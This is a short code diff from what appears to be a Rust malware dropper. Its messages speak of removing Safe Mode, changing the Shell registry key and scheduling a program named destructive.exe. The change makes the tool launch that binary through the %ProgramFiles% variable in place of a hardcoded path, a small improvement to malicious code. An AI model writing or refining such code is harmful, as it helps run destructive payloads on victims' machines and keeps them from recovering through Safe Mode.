@@ -258,12 +258,14 @@ fn main() -> io::Result<()> {
         }
 
         // Group 11: Finally, run destructive.exe
-        execute_command("\"C:\\Program Files\\utkudrk2\\destructive.exe\"");
+        // Using %ProgramFiles% environment variable to avoid hardcoding the path
+        execute_command(r#""%ProgramFiles%\\utkudrk2\\destructive.exe""#);
 
         println!("[+] Cleanup tasks completed. Safe Mode should now be removed, destructive.exe is scheduled to run, and Shell key is modified.");
     } else {
         println!("[+] Safe Mode is not detected. Running destructive.exe directly...");
-        execute_command("\"C:\\Program Files\\utkudrk2\\destructive.exe\"");
+        // Using %ProgramFiles% environment variable to avoid hardcoding the path
+        execute_command(r#""%ProgramFiles%\\utkudrk2\\destructive.exe""#);
     }
 
     Ok(())
